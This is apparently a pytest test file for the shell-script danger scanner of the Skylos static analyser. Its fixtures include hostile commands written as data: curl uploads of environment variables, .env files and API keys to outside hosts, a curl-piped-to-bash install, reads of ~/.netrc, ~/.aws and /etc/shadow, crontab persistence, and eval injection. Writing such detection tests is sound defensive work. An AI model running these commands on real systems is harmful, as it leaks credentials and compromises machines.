from __future__ import annotations

import json
from pathlib import Path

from skylos.analyzer import analyze
from skylos.visitors.languages.shell import scan_shell_file


def _scan_shell_findings(
    tmp_path: Path, code: str, filename: str = "deploy.sh"
) -> list[dict]:
    file_path = tmp_path / filename
    file_path.write_text(code, encoding="utf-8")
    return scan_shell_file(str(file_path), {})[7]


def _rule_ids(findings: list[dict]) -> set[str]:
    return {finding["rule_id"] for finding in findings}


def test_eval_with_positional_arg_flags_command_injection(tmp_path):
    findings = _scan_shell_findings(
        tmp_path,
        """
#!/usr/bin/env bash
cmd="$1"
eval "$cmd"
""",
    )

    assert "SKY-D212" in _rule_ids(findings)


def test_source_with_positional_arg_flags_command_injection(tmp_path):
    findings = _scan_shell_findings(
        tmp_path,
        """
#!/usr/bin/env bash
plugin="$1"
source "$plugin"
""",
    )

    assert "SKY-D212" in _rule_ids(findings)


def test_shell_c_with_positional_arg_flags_command_injection(tmp_path):
    findings = _scan_shell_findings(
        tmp_path,
        """
#!/usr/bin/env bash
task="$1"
sh -c "$task"
""",
    )

    assert "SKY-D212" in _rule_ids(findings)


def test_sudo_shell_c_with_positional_arg_flags_command_injection(tmp_path):
    findings = _scan_shell_findings(
        tmp_path,
        """
#!/usr/bin/env bash
task="$1"
sudo -u app bash -c "$task"
""",
    )

    assert "SKY-D212" in _rule_ids(findings)


def test_basename_does_not_sanitize_shell_commands(tmp_path):
    findings = _scan_shell_findings(
        tmp_path,
        """
#!/usr/bin/env bash
cmd="$(basename -- "$1")"
eval "$cmd"
""",
    )

    assert "SKY-D212" in _rule_ids(findings)


def test_curl_with_read_url_flags_ssrf(tmp_path):
    findings = _scan_shell_findings(
        tmp_path,
        """
#!/usr/bin/env bash
read -r url
curl -fsSL "$url"
""",
    )

    assert "SKY-D216" in _rule_ids(findings)


def test_printenv_piped_to_curl_upload_flags_data_exfil(tmp_path):
    findings = _scan_shell_findings(
        tmp_path,
        """
#!/usr/bin/env bash
printenv | curl -s -X POST https://env.debug.tools/capture -d @-
""",
    )

    assert "SKY-D327" in _rule_ids(findings)


def test_printenv_piped_to_curl_literal_data_not_exfil(tmp_path):
    findings = _scan_shell_findings(
        tmp_path,
        """
#!/usr/bin/env bash
printenv | curl -s -X POST https://env.debug.tools/capture -d skylos-demo
""",
    )

    assert "SKY-D327" not in _rule_ids(findings)


def test_printenv_piped_to_localhost_curl_not_external_exfil(tmp_path):
    findings = _scan_shell_findings(
        tmp_path,
        """
#!/usr/bin/env bash
printenv | curl -s -X POST http://localhost:3000/capture -d @-
""",
    )

    assert "SKY-D327" not in _rule_ids(findings)


def test_secret_env_sent_with_curl_data_flags_data_exfil(tmp_path):
    findings = _scan_shell_findings(
        tmp_path,
        """
#!/usr/bin/env bash
curl -s -X POST https://env.debug.tools/capture -d "$OPENAI_API_KEY"
""",
    )

    assert "SKY-D327" in _rule_ids(findings)


def test_curl_upload_dotenv_flags_data_exfil(tmp_path):
    findings = _scan_shell_findings(
        tmp_path,
        """
#!/usr/bin/env bash
curl -s https://paste.rs -d @.env
""",
    )

    assert "SKY-D327" in _rule_ids(findings)


def test_pip_extra_index_url_flags_package_registry_override(tmp_path):
    findings = _scan_shell_findings(
        tmp_path,
        """
#!/usr/bin/env bash
pip install --extra-index-url https://pypi.internal.corp.dev -r requirements.txt
""",
    )

    assert "SKY-D337" in _rule_ids(findings)


def test_npm_config_set_registry_flags_registry_and_persistent_mutation(tmp_path):
    findings = _scan_shell_findings(
        tmp_path,
        """
#!/usr/bin/env bash
npm config set registry https://registry.npm-packages.io
""",
    )

    ids = _rule_ids(findings)
    assert "SKY-D337" in ids
    assert "SKY-D339" in ids


def test_package_setup_script_flags_untrusted_tool_execution(tmp_path):
    findings = _scan_shell_findings(
        tmp_path,
        """
#!/usr/bin/env bash
npm run setup
""",
    )

    assert "SKY-D341" in _rule_ids(findings)


def test_grep_aws_config_flags_scope_violation(tmp_path):
    findings = _scan_shell_findings(
        tmp_path,
        """
#!/usr/bin/env bash
grep -r "AWS_SECRET" ~/.aws/
""",
    )

    assert "SKY-D338" in _rule_ids(findings)


def test_npm_publish_flags_release_command(tmp_path):
    findings = _scan_shell_findings(
        tmp_path,
        """
#!/usr/bin/env bash
npm publish
""",
    )

    assert "SKY-D340" in _rule_ids(findings)


def test_docker_run_host_root_mount_flags_scope_violation(tmp_path):
    findings = _scan_shell_findings(
        tmp_path,
        """
#!/usr/bin/env bash
docker run --rm -v /:/host alpine cat /host/etc/shadow
""",
    )

    assert "SKY-D338" in _rule_ids(findings)


def test_cat_netrc_flags_scope_violation(tmp_path):
    findings = _scan_shell_findings(
        tmp_path,
        """
#!/usr/bin/env bash
cat ~/.netrc
""",
    )

    assert "SKY-D338" in _rule_ids(findings)


def test_shell_profile_write_flags_persistent_mutation(tmp_path):
    findings = _scan_shell_findings(
        tmp_path,
        """
#!/usr/bin/env bash
echo 'export NODE_EXTRA_CA_CERTS=/tmp/.corp-cert.pem' >> ~/.zshrc
""",
    )

    assert "SKY-D339" in _rule_ids(findings)


def test_npx_yes_latest_flags_untrusted_tool_execution(tmp_path):
    findings = _scan_shell_findings(
        tmp_path,
        """
#!/usr/bin/env bash
npx -y totally-legit-tool@latest ./src
""",
    )

    assert "SKY-D341" in _rule_ids(findings)


def test_crontab_write_flags_persistent_mutation(tmp_path):
    findings = _scan_shell_findings(
        tmp_path,
        """
#!/usr/bin/env bash
crontab -l | { cat; echo "*/5 * * * * curl -s https://ping.example.com"; } | crontab -
""",
    )

    assert "SKY-D339" in _rule_ids(findings)


def test_dotenv_local_uploaded_to_curl_flags_data_exfil(tmp_path):
    findings = _scan_shell_findings(
        tmp_path,
        """
#!/usr/bin/env bash
cat .env.local | curl -F file=@- https://debug.example/upload
""",
    )

    assert "SKY-D327" in _rule_ids(findings)


def test_dotenv_local_direct_curl_form_upload_flags_data_exfil(tmp_path):
    findings = _scan_shell_findings(
        tmp_path,
        """
#!/usr/bin/env bash
curl -F file=@.env.local https://debug.example/upload
""",
    )

    assert "SKY-D327" in _rule_ids(findings)


def test_remote_script_piped_to_shell_flags(tmp_path):
    findings = _scan_shell_findings(
        tmp_path,
        """
#!/usr/bin/env bash
curl -fsSL https://install.example/setup.sh | bash
""",
    )

    assert "SKY-D328" in _rule_ids(findings)


def test_broad_destructive_rm_flags(tmp_path):
    findings = _scan_shell_findings(
        tmp_path,
        """
#!/usr/bin/env bash
rm -rf ~/.cache-to-reset
""",
    )

    assert "SKY-D329" in _rule_ids(findings)


def test_curl_fixed_host_with_tainted_path_is_not_ssrf(tmp_path):
    findings = _scan_shell_findings(
        tmp_path,
        """
#!/usr/bin/env bash
artifact="$1"
curl -fsSL "https://downloads.example.com/releases/$artifact"
""",
    )

    assert "SKY-D216" not in _rule_ids(findings)


def test_file_sink_with_positional_arg_flags_path_traversal(tmp_path):
    findings = _scan_shell_findings(
        tmp_path,
        """
#!/usr/bin/env bash
backup_name="$1"
cat "/srv/backups/$backup_name"
""",
    )

    assert "SKY-D215" in _rule_ids(findings)


def test_basename_sanitized_file_path_is_safe(tmp_path):
    findings = _scan_shell_findings(
        tmp_path,
        """
#!/usr/bin/env bash
backup_name="$(basename -- "$1")"
cat "/srv/backups/$backup_name"
""",
    )

    assert "SKY-D215" not in _rule_ids(findings)


def test_analyzer_discovers_shell_scripts(tmp_path):
    script = tmp_path / "deploy.sh"
    script.write_text(
        """
#!/usr/bin/env bash
cmd="$1"
eval "$cmd"
""",
        encoding="utf-8",
    )

    result = json.loads(
        analyze(str(tmp_path), enable_danger=True, conf=0, grep_verify=False)
    )

    assert result["analysis_summary"]["languages"] == {"Shell": 1}
    assert "SKY-D212" in _rule_ids(result["danger"])
